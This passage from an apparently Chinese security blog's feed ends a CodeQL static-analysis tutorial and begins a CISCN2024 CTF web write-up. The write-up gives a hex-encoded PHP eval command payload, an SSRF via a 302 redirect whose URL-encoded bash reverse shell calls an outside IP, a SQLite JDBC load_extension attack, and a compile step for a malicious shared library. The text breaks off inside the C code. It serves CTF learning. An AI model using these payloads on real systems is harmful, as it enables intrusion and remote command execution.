C++项目的数据库的命令如下，多一个参数而已：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create cpp-database --language=c-cpp --command=make</span><br></pre></td></tr></table></figure><p>显式指定构建命令生成 C## 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create csharp-database --language=csharp --command=&#x27;dotnet build /t:rebuild&#x27;</span><br></pre></td></tr></table></figure><p>显式 指定环境变量 &#x2F; 指定构建脚本 生成 Go 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go</span><br><span class="line"></span><br><span class="line">codeql database create go-database --language=go --command=&#x27;./scripts/build.sh&#x27;</span><br></pre></td></tr></table></figure><p>显示指定 maven 生成 Java 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create java-database --language=java-kotlin --command=&#x27;mvn clean install&#x27;</span><br></pre></td></tr></table></figure><p>显示指定 Ant 生成 Java 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create java-database --language=java-kotlin --command=&#x27;ant -f build.xml&#x27;</span><br></pre></td></tr></table></figure><h3 id="执行查询"><a href="#执行查询" class="headerlink" title="执行查询"></a>执行查询</h3><p>创建完数据库之后，在 vscode 的插件里按文件夹导入，即可创建 ql 脚本，执行查询操作。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9e615ac872577ad8d2ec0cde0f94502a.png"></p><h3 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h3><p>类似 sql 查询，通过 运行 ql 语句进行查询操作，同时返回一个结果集，包含符合 ql 语句要求的代码片段。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/b70fb9bfc11b6534e91c06e6d9f045eb.png"></p><h2 id="CodeQL-快速入门"><a href="#CodeQL-快速入门" class="headerlink" title="CodeQL 快速入门"></a>CodeQL 快速入门</h2><p>首先是环境搭建，官方文档推荐使用 vscode extension，本质就是下面三步走：</p><ul><li>下载 codeql-cli 和 packs 的<a href="https://github.com/github/codeql-action/releases">捆绑包</a>，并配置好环境变量</li><li>vscode 安装 CodeQL 插件，并在 vscode extension settings 里配置好 codeql-cli 的路径</li><li>下载 <a href="https://github.com/github/vscode-codeql-starter/">vscode-codeql-starter workspace</a>，双击 <code>vscode-codeql-starter.code-workspace</code>打开 workspace</li></ul><h3 id="游戏例子"><a href="#游戏例子" class="headerlink" title="游戏例子"></a>游戏例子</h3><p>官方文档里，通过游戏例子帮助入门： <a href="https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/">https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/</a></p><p>例-01：find the thief</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> See https:<span class="operator">/</span><span class="operator">/</span>codeql.github.com<span class="operator">/</span>docs<span class="operator">/</span>writing<span class="operator">-</span>codeql<span class="operator">-</span>queries<span class="operator">/</span>ql<span class="operator">-</span>tutorials<span class="operator">/</span>#ql<span class="operator">-</span>tutorials.</span><br><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Person t</span><br><span class="line"><span class="keyword">where</span> t.getHeight() <span class="operator">&gt;</span> <span class="number">150</span></span><br><span class="line">    <span class="keyword">and</span> t.getHairColor() <span class="operator">!=</span> &quot;blond&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exists</span>( string c <span class="operator">|</span> t.getHairColor() <span class="operator">=</span> c)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> t.getAge() <span class="operator">&lt;</span> <span class="number">30</span></span><br><span class="line">    <span class="keyword">and</span> t.getLocation() <span class="operator">=</span> &quot;east&quot;</span><br><span class="line">    <span class="keyword">and</span> (t.getHairColor() <span class="operator">=</span> &quot;brown&quot; <span class="keyword">or</span> t.getHairColor() <span class="operator">=</span> &quot;black&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> (t.getHeight() <span class="operator">&gt;</span> <span class="number">180</span> <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="number">190</span>)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> forall(Person p <span class="operator">|</span> t.getAge() <span class="operator">&gt;</span> p.getAge())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">!=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span> <span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="built_in">avg</span>(Person p <span class="operator">|</span>  <span class="operator">|</span>p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span>p.getLocation()<span class="operator">=</span>&quot;east&quot;<span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getAge())</span><br><span class="line"><span class="keyword">select</span> t</span><br></pre></td></tr></table></figure><p>例-02：Catch the fire starter</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line">predicate isSouthern(Person p) &#123;</span><br><span class="line">    p.getLocation() <span class="operator">=</span> &quot;south&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isBald(Person p) &#123;</span><br><span class="line">    <span class="keyword">not</span> <span class="keyword">exists</span>(string c <span class="operator">|</span> p.getHairColor() <span class="operator">=</span> c )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Southerner extends Person &#123;</span><br><span class="line">    Southerner() &#123; isSouthern(this) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child extends Person&#123;</span><br><span class="line">    Child()&#123;this.getAge() <span class="operator">&lt;</span> <span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAllowedIn(string region) &#123;</span><br><span class="line">        region <span class="operator">=</span> this.getLocation()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Southerner s</span><br><span class="line"><span class="keyword">where</span> s.isAllowedIn(&quot;north&quot;) </span><br><span class="line">    <span class="keyword">and</span> isBald(s)</span><br><span class="line"><span class="keyword">select</span> s, s.getAge()</span><br></pre></td></tr></table></figure><p>例-03：Crown the rightful heir</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line">Person childOf(Person p) &#123;</span><br><span class="line">    p <span class="operator">=</span> parentOf(<span class="keyword">result</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person ancestorOf(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> parentOf(p) <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> parentOf(ancestorOf(p))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person relativeOf(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> childOf<span class="operator">*</span>(ancestorOf(p)) <span class="keyword">and</span> <span class="keyword">not</span> result.isDeceased()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person isATheif(Person t)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> t </span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&gt;</span> <span class="number">150</span></span><br><span class="line">    <span class="keyword">and</span> t.getHairColor() <span class="operator">!=</span> &quot;blond&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exists</span>( string c <span class="operator">|</span> t.getHairColor() <span class="operator">=</span> c)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> t.getAge() <span class="operator">&lt;</span> <span class="number">30</span></span><br><span class="line">    <span class="keyword">and</span> t.getLocation() <span class="operator">=</span> &quot;east&quot;</span><br><span class="line">    <span class="keyword">and</span> (t.getHairColor() <span class="operator">=</span> &quot;brown&quot; <span class="keyword">or</span> t.getHairColor() <span class="operator">=</span> &quot;black&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> (t.getHeight() <span class="operator">&gt;</span> <span class="number">180</span> <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="number">190</span>)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> forall(Person p <span class="operator">|</span> t.getAge() <span class="operator">&gt;</span> p.getAge())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">!=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span> <span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="built_in">avg</span>(Person p <span class="operator">|</span>  <span class="operator">|</span>p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span>p.getLocation()<span class="operator">=</span>&quot;east&quot;<span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getAge())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person isAFireStarter(Person f)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> f </span><br><span class="line">    <span class="keyword">and</span> f.getLocation() <span class="operator">=</span> &quot;south&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> f.getAge() <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(string c <span class="operator">|</span> f.getHairColor() <span class="operator">=</span> c )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person hasCriminalRecord(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> isAFireStarter(p) <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> isATheif(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Person p</span><br><span class="line"><span class="keyword">where</span> p <span class="operator">=</span> relativeOf(&quot;King Basil&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> p <span class="operator">=</span> hasCriminalRecord(p)</span><br><span class="line"><span class="keyword">select</span> p <span class="operator">+</span> &quot; You are the next king!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例-04：Cross the river，这个偏算法思想，不看。</p><h3 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h3><p>以 java-sec-code 项目为例，创建数据库命令的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language=java --source-root=/Users/jasper/Documents/Security/java/java-sec-code --command=&quot;mvn clean package&quot;</span><br></pre></td></tr></table></figure><p>点侧栏点CodeQL插件，选Java -&gt; 导入上面创建的数据库 -&gt; 运行example.ql，能正常运行输出结果说明环境正常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a82ac657b9b2f45af73a256c789aad21.png"></p><p>再以 activemq 为例，注意 maven build 需要科学上网，源码是直接在 activmq GitHub clone 的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create .\codeql-databases\activemq --language=java-kotlin --source-root .\activemq-activemq-6.1.5\ --command=&#x27;mvn clean install -Dmaven.test.skip=true&#x27;</span><br></pre></td></tr></table></figure><p>编写查询，查找 activemq 项目里所有调用了 <code>.equals(&quot;&quot;)</code> 的函数，并且调用 该 <code>equals()</code> 的对象的类型应为  String</p><p>注意：官方文档上 MethodAccess 已经弃用，MethodAccess 改名为 MehtodCall，MehtodCall.getMethod()获取到的是被调用的函数，即 <code>callee</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MethodCall mc</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    mc.getMethod().hasName(&quot;equals&quot;) <span class="keyword">and</span></span><br><span class="line">    mc.getArgument(<span class="number">0</span>).(StringLiteral).getValue() <span class="operator">=</span> &quot;&quot; <span class="keyword">and</span></span><br><span class="line">    mc.getQualifier().getType() instanceof TypeString</span><br><span class="line"><span class="keyword">select</span> mc, &quot;This comparison to empty string is inefficient, use isEmpty() instead.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8b9b95419c6a0d400e200499bb22c15b.png"></p><p>再例如，创建一个 python 项目的 codeql-database 命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create ./salt-codeql-database --language=python --source-root ./salt-master</span><br></pre></td></tr></table></figure><p>再写入如下 ql 语句，查找函数参数数量大于7的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Function</span> f</span><br><span class="line"><span class="keyword">where</span> <span class="built_in">count</span>(f.getAnArg()) <span class="operator">&gt;</span> <span class="number">7</span></span><br><span class="line"><span class="keyword">select</span> f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1badbf9fb56b109f82a2981123d71359.png"></p><h2 id="CodeQL-参考文档"><a href="#CodeQL-参考文档" class="headerlink" title="CodeQL 参考文档"></a>CodeQL 参考文档</h2><ol><li><a href="https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/">codeql for java</a>：在 Java 项目中进行简单的 CodeQL 查询，常用的类都有一些例子，具备参考价值。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/">QL language reference</a> ：QL 查询语言教程，列举了 Predicates、Types 等类的广义用法，比上面的更全面。</li><li><a href="https://codeql.github.com/codeql-standard-libraries/java/">standard librares for java</a> ：有关 codeql for java 的所有类和方法的文档，过于全面。</li><li><a href="https://codeql.github.com/codeql-query-help/java-cwe/">CWE for Java</a> ： 漏洞扫描脚本，包括 JNDI、log4j等，可作为查询编写的参考，在 <code>java-queries/securiy</code> 目录下。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CodeQL-概览&quot;&gt;&lt;a href=&quot;#CodeQL-概览&quot; class=&quot;headerlink&quot; title=&quot;CodeQL 概览&quot;&gt;&lt;/a&gt;CodeQL 概览&lt;/h2&gt;&lt;p&gt;CodeQL是一个静态代码分析引擎，用来给半自动化检查代码中可能存在的漏洞和bug。</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2024 writeup（web部分）</title>
    <link href="https://jaspersec.top/posts/3286688009.html"/>
    <id>https://jaspersec.top/posts/3286688009.html</id>
    <published>2024-05-24T16:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要复现一下ezjava，jdbc attack还是很有意思的</p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png" alt="image-20240525044153901"></p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p><p>vps上用php -S 0.0.0.0:8080 起一个http服务，写上跳转脚本，利用题目自带的后门反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1/flag.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%31%36%2e%36%32%2e%33%38%2e%37%31%2f%39%39%39%39%20%30%3e%26%31%22&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);  </span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>利用接口访问vps，利用302跳转反弹shell拿到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png" alt="image-20240525044216568"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p><p>我们加一个图片头绕过一下就好了，这里有点坑，要多加几个<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png" alt="image-20240525044243126"></p><p>payload区别不大，注意这里text不能重复，不然不会进代码逻辑</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=api&amp;c=api&amp;m=qrcode&amp;text=7777777777777&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png" alt="image-20240525044331116"></p><p>PS：上面的方法在比赛可以过，但是在ctfshow的靶场上是过不了的，复现的师傅注意一下。</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p><p>简单说一下整体思路：</p><ol><li>让client访问vps上的rce.so，利用缓存在client的&#x2F;tmp下写文件（文件名可计算）</li><li>再让client访问恶意数据库，触发jdbc attack执行load_extension，加载上面写入的文件实现rce</li></ol><p>首先是JdbcController可以传任意的jdbc bean，即sql配置参数可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdbcController  </span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;    </span><br><span class="line">    <span class="keyword">try</span> &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">1</span>), String.join((CharSequence)<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">0</span>), <span class="string">&quot;\u8fde\u63a5\u5931\u8d25&quot;</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，在service层会有switch分支，通过传入的type值决定使用不同Driver去链接数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DatasourceServiceImpl  </span></span><br><span class="line"><span class="keyword">switch</span> (jdbcBean.getType()) &#123;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));    </span><br><span class="line">        <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> mysqlDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));    </span><br><span class="line">        <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> postgresDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: &#123;    </span><br><span class="line">        <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> sqliteDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));    </span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">default</span>: &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里漏洞点比较明显，在utils的sqlite工具类里，可以发现开了load_extension，说明可以打sqlite jdbc attack，sqlite jdbc attack不像其他可以直接反序列化结合组件rce，sqlite只能执行sql语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SqliteDatasourceConnector  </span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SqliteDatasourceConnector</span><span class="params">(String url)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;    </span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">    <span class="type">SQLiteConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQLiteConfig</span>();    </span><br><span class="line">    config.enableLoadExtension(<span class="literal">true</span>);    </span><br><span class="line">    <span class="built_in">this</span>.connection = DriverManager.getConnection(url, config.toProperties());    </span><br><span class="line">    <span class="built_in">this</span>.connection.setAutoCommit(<span class="literal">true</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和mysql的udf提权很像，在可以执行sql命令之后，考虑通过加载.so文件来实现rce</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 编译命令，注意要在linux环境下编译  </span><br><span class="line">gcc -g -fPIC -shared rce.c -o rce.so</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 